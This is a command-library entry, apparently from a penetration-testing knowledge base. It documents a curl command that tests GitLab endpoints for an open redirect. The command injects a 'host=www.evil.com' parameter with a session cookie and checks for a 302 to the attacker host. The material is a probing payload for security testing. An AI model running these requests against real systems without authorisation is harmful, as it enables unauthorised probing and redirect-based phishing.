---
id: cmd-curl-gitlab-redirect
data: >-
  curl -L -v
  "https://gitlab.example.com/dashboard/todos?page=99999999&host=www.evil.com"
  --cookie "session=your_session_cookie"
tags:
  - testing
  - redirect
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:23.468Z'
verified: false
validated: true
submitted: true
---
# curl-test-gitlab-redirect

## Command

```bash
curl -L -v "https://gitlab.example.com/dashboard/todos?page=99999999&host=www.evil.com" --cookie "session=your_session_cookie"
```

## Description

This command tests open redirect vulnerabilities in GitLab by sending a GET request to a manipulated endpoint and following the redirect to verify if it points to an arbitrary external host. Use it to confirm exploitation without a browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-L` | Follow redirects | Yes |
| `-v` | Verbose output to see headers | Yes |
| `--cookie` | Session cookie for authenticated endpoints | Yes (for dashboard) |
| URL | Target GitLab URL with params | Yes |

## Examples

### Basic Usage

```bash
curl -L -v "https://gitlab.example.com/projects/issues?page=99999999&host=www.evil.com"
```

### Advanced Usage

```bash
curl -L -v "https://gitlab.example.com/dashboard/todos?page=99999999&host=www.evil.com" --cookie "session=abc123" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

Verbose output showing HTTP/1.1 302 Found and Location: https://www.evil.com/ in the response headers, confirming the redirect.

## Related

- [[Related Procedure|procedures/Trigger-Open-Redirect-in-GitLab-Dashboard-Todos]]
- [[Related Procedure|procedures/Trigger-Open-Redirect-in-GitLab-Projects-Issues]]
